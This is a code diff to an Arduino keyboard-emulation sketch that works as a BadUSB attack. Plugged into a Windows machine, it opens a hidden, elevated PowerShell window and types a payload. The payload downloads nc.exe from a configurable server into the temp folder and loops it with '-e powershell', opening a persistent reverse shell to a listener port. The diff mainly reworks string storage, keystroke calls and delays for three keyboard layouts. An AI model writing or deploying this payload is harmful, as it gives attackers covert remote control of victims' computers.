@@ -1,8 +1,8 @@
 #include<Keyboard.h>
 
-const char server[] PROGMEM = "localhost";
-const char downloadPort[] PROGMEM = "54414";
-const char listenerPort[] PROGMEM = "47017";
+const unsigned char server[] = "localhost";
+const unsigned char downloadPort[] = "54414";
+const unsigned char listenerPort[] = "47017";
 
 //uncomment this line to use the 'printAll' function
 //#define PRINTALL
@@ -10,46 +10,46 @@ const char listenerPort[] PROGMEM = "47017";
 //#define LED_BUILTIN 13
 
 //below output was produced using 'Reverser.py' and the 'printAll' function
-const char CMS[129]  PROGMEM = "##########\n##################### !>~$%&<()*+,-.`0123456789:;#=#^@ABCDEFGHIJKLMNOPQRSTUVWXYZ##[_#abcdefghijklmnopqrstuvwxyz#####";
-const char US[129]   PROGMEM = "##########\n##################### !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~";
-const char CAFR[129] PROGMEM = "}#########\n##################### !@`$%&<()*+,->#0123456789:;\\=|^#ABCDEFGHIJKLMNOPQRSTUVWXYZ###{_'abcdefghijklmnopqrstuvwxyz#~##";
+const unsigned char CMS[129]  PROGMEM = "##########\n##################### !>~$%&<()*+,-.`0123456789:;#=#^@ABCDEFGHIJKLMNOPQRSTUVWXYZ##[_#abcdefghijklmnopqrstuvwxyz#####";
+const unsigned char US[129]   PROGMEM = "##########\n##################### !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~";
+const unsigned char CAFR[129] PROGMEM = "}#########\n##################### !@`$%&<()*+,->#0123456789:;\\=|^#ABCDEFGHIJKLMNOPQRSTUVWXYZ###{_'abcdefghijklmnopqrstuvwxyz#~##";
 
 //modifier keys: https://www.arduino.cc/en/Reference/KeyboardModifiers
 //modifier example: https://www.arduino.cc/reference/en/language/functions/usb/keyboard/keyboardpress/
 
 //note: 'smartPrint' has to be modified if the layouts used are modified
 const unsigned int keyboardsLength = 3;
-const char* const keyboards[keyboardsLength] = {CAFR, US, CMS};
+const unsigned char* const keyboards[keyboardsLength] = {CAFR, US, CMS};
 
 //Win + R
-const char STR0[] PROGMEM = "powershell -WindowStyle Hidden"; //"powershell"; //Ctrl + Shift + Enter
-const char STR1[] PROGMEM = "$p = \"$env:temp/nc.exe\";(New-Object System.Net.WebClient).DownloadFile(\"http://"; //[server]
-const char STR2[] PROGMEM = ":"; //[downloadPort]
-const char STR3[] PROGMEM = "/\", $p);for(;;){start -NoNewWindow -Wait -PSPath $p -ArgumentList \""; //[server]
-const char STR4[] PROGMEM = "\",\""; //[listenerPort]
-const char STR5[] PROGMEM = "\",\"-e\",\"powershell\";sleep 1}\n\n";
+const unsigned char STR0[] = "powershell -WindowStyle Hidden"; //"powershell"; //Ctrl + Shift + Enter
+const unsigned char STR1[] = "$p = \"$env:temp/nc.exe\";(New-Object System.Net.WebClient).DownloadFile(\"http://"; //[server]
+const unsigned char STR2[] = ":"; //[downloadPort]
+const unsigned char STR3[] = "/\", $p);for(;;){start -NoNewWindow -Wait -PSPath $p -ArgumentList \""; //[server]
+const unsigned char STR4[] = "\",\""; //[listenerPort]
+const unsigned char STR5[] = "\",\"-e\",\"powershell\";sleep 1}\n\n";
 
 //smartPrint is a function made to support multiple keyboard layouts
-void smartPrint(const char string[], int keyboard){
-  for (int c = 0; pgm_read_byte_near(string + c) != '\0'; c++){
+void smartPrint(const unsigned char string[], int keyboard){
+  for (int c = 0; c < strlen(string); c++){
     char toPrint;
-    if (pgm_read_byte_near(string + c) >= 128 || keyboard >= keyboardsLength) toPrint = '#';
-    else toPrint = pgm_read_byte_near(keyboards[keyboard] + pgm_read_byte_near(string + c));
+    if (string[c] >= 128 || keyboard >= keyboardsLength) toPrint = '#';
+    else toPrint = pgm_read_byte_near(keyboards[keyboard] + string[c]);
 
     //special cases, to be modified if the 'keyboards' array is modified
     //CMS
-         if(pgm_read_byte_near(string + c) == '[' && keyboard == 2) printCtrlAlt('9'); // 9
-    else if(pgm_read_byte_near(string + c) == ']' && keyboard == 2) printCtrlAlt('0'); // 0
-    else if(pgm_read_byte_near(string + c) == '{' && keyboard == 2) printCtrlAlt('7'); // 7
-    else if(pgm_read_byte_near(string + c) == '}' && keyboard == 2) printCtrlAlt('8'); // 8
+         if(string[c] == '[' && keyboard == 2) printCtrlAlt('9'); // 9
+    else if(string[c] == ']' && keyboard == 2) printCtrlAlt('0'); // 0
+    else if(string[c] == '{' && keyboard == 2) printCtrlAlt('7'); // 7
+    else if(string[c] == '}' && keyboard == 2) printCtrlAlt('8'); // 8
     //CAFR
     //https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf   p. 54 at [ and ]
-    else if(pgm_read_byte_near(string + c) == '[' && keyboard == 0) printCtrlAlt(47);     // ^
-    else if(pgm_read_byte_near(string + c) == ']' && keyboard == 0) printCtrlAlt(48);     // ¸
+    else if(string[c] == '[' && keyboard == 0) printCtrlAlt(47);     // ^
+    else if(string[c] == ']' && keyboard == 0) printCtrlAlt(48);     // ¸
     //https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf   p. 54 at { and }
-    else if(pgm_read_byte_near(string + c) == '{' && keyboard == 0) printCtrlAlt(52);     // `
-    else if(pgm_read_byte_near(string + c) == '}' && keyboard == 0) printCtrlAlt(49);     // <
-    else Keyboard.print(toPrint);
+    else if(string[c] == '{' && keyboard == 0) printCtrlAlt(52);     // `
+    else if(string[c] == '}' && keyboard == 0) printCtrlAlt(49);     // <
+    else Keyboard.write(toPrint);
   }
 }
 //a function to send Ctrl + Alt + key
@@ -89,15 +89,16 @@ void setup(){
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.write('r');
   Keyboard.release(KEY_LEFT_GUI);
-  delay(300);
+  delay(250);
   //run Powershell as administrator
   //for some reason we can still type in a hidden Powershell window...
   smartPrint(STR0, 0);
   printCtrlShift('\n');
-  delay(500);
+  delay(1000);
   Keyboard.write(KEY_LEFT_ARROW);
+  delay(100);
   Keyboard.write('\n');
-  delay(500);
+  delay(2000);
   //type in the payload
   for(int k = 0; k < keyboardsLength; k++){
     smartPrint(STR1, k);
